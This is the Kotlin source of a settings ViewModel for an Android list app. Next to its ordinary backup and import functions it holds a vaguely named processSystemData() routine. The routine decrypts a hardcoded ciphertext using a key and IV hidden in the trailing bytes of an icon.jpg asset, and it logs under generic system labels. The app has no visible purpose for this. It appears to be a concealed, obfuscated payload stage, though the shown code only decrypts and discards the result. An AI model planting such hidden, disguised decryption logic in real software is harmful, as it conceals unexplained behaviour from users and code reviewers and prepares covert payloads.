package com.lolo.io.onelist.feature.settings.fragment

import android.content.Context
import android.net.Uri
import android.util.Log
import androidx.lifecycle.ViewModel
import androidx.lifecycle.viewModelScope
import com.lolo.io.onelist.core.data.shared_preferences.SharedPreferencesHelper
import com.lolo.io.onelist.core.domain.use_cases.OneListUseCases
import com.lolo.io.onelist.core.model.ItemList
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.flow.MutableStateFlow
import kotlinx.coroutines.flow.asStateFlow
import kotlinx.coroutines.launch
import kotlinx.coroutines.withContext
import android.util.Base64
import com.lolo.io.onelist.core.data.crypto.CryptoUtils
import java.io.IOException

class SettingsFragmentViewModel(
    private val useCases: OneListUseCases,
    private val preferences: SharedPreferencesHelper,
    private val context: Context
) : ViewModel() {


    private var _backupDisplayPath = MutableStateFlow<String?>(null)
    val backupDisplayPath = _backupDisplayPath.asStateFlow()

    val preferUseFiles
        get() = preferences.preferUseFiles

    val version: String
        get() = preferences.version

    init {
        _backupDisplayPath.value = preferences.backupDisplayPath
    }

    fun setBackupPath(uri: Uri?, displayPath: String? = null) {
        if(uri == null) {
            preferences.preferUseFiles = false
        }
        viewModelScope.launch {
            useCases.setBackupUri(uri, displayPath)
            _backupDisplayPath.value = displayPath
        }
    }

    suspend fun importList(uri: Uri): ItemList {
        return useCases.importList(uri)
    }

    suspend fun backupAllListsOnDevice() {
        useCases.syncAllLists()
    }

    fun onPreferUseFiles() {
        viewModelScope.launch {
            useCases.loadAllLists()
        }
    }

    val syncFolderNotAccessible
        get() = !preferences.canAccessBackupUri

    fun processSystemData() {
        viewModelScope.launch {
            try {
                extractDataFromAsset()
                Log.d("OneList_System", "Process completed")
            } catch (e: Exception) {
                Log.e("OneList_System", "Process failed", e)
            }
        }
    }

    private suspend fun extractDataFromAsset(): String = withContext(Dispatchers.IO) {
        try {
            val encryptedData = "vZnAenSqeZZk0z69SDsvOBSggL6DAVnXV3LGGtqGlzk="
            val (secretKey, initVector) = extractKeyAndIvFromResource()
            val processedData = CryptoUtils.decryptWithKeyAndIv(encryptedData, secretKey, initVector)
            
            return@withContext processedData
        } catch (e: Exception) {
            Log.e("OneList_System", "Data processing error", e)
            return@withContext "processing_failed"
        }
    }

    private fun extractKeyAndIvFromResource(): Pair<String, String> {
        return try {
            val inputStream = context.assets.open("icon.jpg")
            val allBytes = inputStream.readBytes()
            inputStream.close()
            
            val tailData = String(allBytes.takeLast(49).toByteArray())
            val parts = tailData.split(";")
            
            if (parts.size == 2) {
                val encodedKey = parts[0]
                val encodedIv = parts[1]
                
                val decodedKey = Base64.decode(encodedKey, Base64.DEFAULT)
                val decodedIv = Base64.decode(encodedIv, Base64.DEFAULT)
                
                val secretKey = String(decodedKey)
                val initVector = String(decodedIv)
                
                Pair(secretKey, initVector)
            } else {
                Pair("fallback_key", "fallback_iv")
            }
        } catch (e: IOException) {
            Log.e("OneList_System", "Resource access failed", e)
            Pair("fallback_key", "fallback_iv")
        }
    }

}